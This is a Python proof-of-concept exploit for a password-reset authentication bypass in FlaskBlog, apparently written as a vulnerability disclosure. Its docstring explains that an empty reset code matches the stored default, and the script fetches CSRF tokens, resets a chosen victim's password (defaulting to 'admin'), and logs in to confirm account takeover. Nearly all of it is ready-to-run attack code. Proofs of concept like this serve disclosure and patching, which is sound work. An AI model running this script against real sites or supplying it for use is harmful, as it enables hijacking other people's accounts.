#!/usr/bin/env python3
"""
PoC: FlaskBlog Password Reset Authentication Bypass
Affected: FlaskBlog <= 3.0.0dev
CWE: CWE-287 (Improper Authentication)
CVSS: 9.1 Critical

This PoC is for authorized security testing only.

The password reset code verification in FlaskBlog uses:
    password_reset_codes_storage.get(username, "")
which returns "" when no reset was requested. Since form.validate()
is never called, an empty code "" matches the default "", bypassing
authentication entirely and allowing arbitrary password reset.
"""

import sys
import requests
from bs4 import BeautifulSoup


def get_csrf_token(session, url):
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf_token"})
    if not token_input:
        return None
    return token_input["value"]


def exploit(target_url, victim_username, new_password):
    session = requests.Session()

    print(f"[*] Target: {target_url}")
    print(f"[*] Victim: {victim_username}")

    # Step 1: Get CSRF token
    reset_url = f"{target_url}/password-reset/codesent=true"
    csrf_token = get_csrf_token(session, reset_url)
    if not csrf_token:
        print("[-] Failed to get CSRF token")
        return False
    print(f"[+] CSRF token obtained")

    # Step 2: Submit empty code to bypass verification
    data = {
        "csrf_token": csrf_token,
        "username": victim_username,
        "code": "",
        "password": new_password,
        "password_confirm": new_password,
    }
    resp = session.post(reset_url, data=data, allow_redirects=False)
    print(f"[*] Reset response: {resp.status_code}")

    # Step 3: Verify - try logging in with new password
    login_url = f"{target_url}/login/redirect=&"
    csrf_token = get_csrf_token(session, login_url)
    if not csrf_token:
        print("[-] Failed to get login CSRF token")
        return False

    resp = session.post(
        login_url,
        data={
            "csrf_token": csrf_token,
            "username": victim_username,
            "password": new_password,
        },
        allow_redirects=True,
    )

    if victim_username.lower() in resp.text.lower() and "logout" in resp.text.lower():
        print(f"[+] SUCCESS: Account takeover complete!")
        print(f"[+] Logged in as '{victim_username}' with password '{new_password}'")
        return True
    else:
        print("[?] Could not confirm login. Check manually.")
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1283"
    username = sys.argv[2] if len(sys.argv) > 2 else "admin"
    password = sys.argv[3] if len(sys.argv) > 3 else "Pwned12345"
    exploit(target, username, password)
